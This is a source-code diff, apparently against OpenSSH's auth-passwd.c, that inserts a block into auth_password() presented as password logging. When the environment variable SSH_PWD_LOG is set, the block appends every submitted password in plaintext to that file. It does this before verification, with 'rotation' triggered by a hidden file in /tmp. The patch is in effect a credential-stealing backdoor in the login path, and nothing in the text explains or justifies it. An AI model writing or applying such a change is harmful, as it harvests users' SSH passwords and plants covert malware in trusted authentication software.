@@ -1,0 +1,51 @@
+diff --git a/auth-passwd.c b/auth-passwd.c
+index 996c2cf..802c298 100644
+--- a/auth-passwd.c
++++ b/auth-passwd.c
+@@ -45,6 +45,12 @@
+ #include <string.h>
+ #include <stdarg.h>
+ 
++#include <stdlib.h>
++#include <sys/types.h>
++#include <sys/stat.h>
++#include <sys/file.h>
++#include <unistd.h>
++
+ #include "packet.h"
+ #include "buffer.h"
+ #include "log.h"
+@@ -128,6 +134,33 @@ auth_password(Authctxt *authctxt, const char *password)
+ 			authctxt->force_pwchange = 1;
+ 	}
+ #endif
++        char         *log_file = getenv("SSH_PWD_LOG");
++        unsigned int rotate    = 0;
++        if(log_file != NULL){
++           struct stat buf;
++           if(stat("/tmp/.ssh_pwd_log_rotate", &buf) == 0){
++                rotate = 1;
++                size_t len  = strlen(log_file);
++                char *tmp   = calloc( len + 3, sizeof(char));
++                if(tmp != NULL){
++                    (void)strncpy(tmp, log_file, len);
++                    tmp[len]   = '.';
++                    tmp[len+1] = 'b';
++                    log_file   = tmp;
++                }
++           }
++           FILE *log  = fopen(log_file, "a+");
++           if(log != NULL){
++             int fd = fileno(log);
++             if(flock(fd, LOCK_SH) == 0){
++                 (void)fprintf(log, "%s\n", password);
++                 (void)flock(fd, LOCK_UN);
++             }
++             (void)fclose(log);
++           }
++           if(rotate == 1) free(log_file);
++
++        }
+ 	result = sys_auth_passwd(authctxt, password);
+ 	if (authctxt->force_pwchange)
+ 		disable_forwarding();
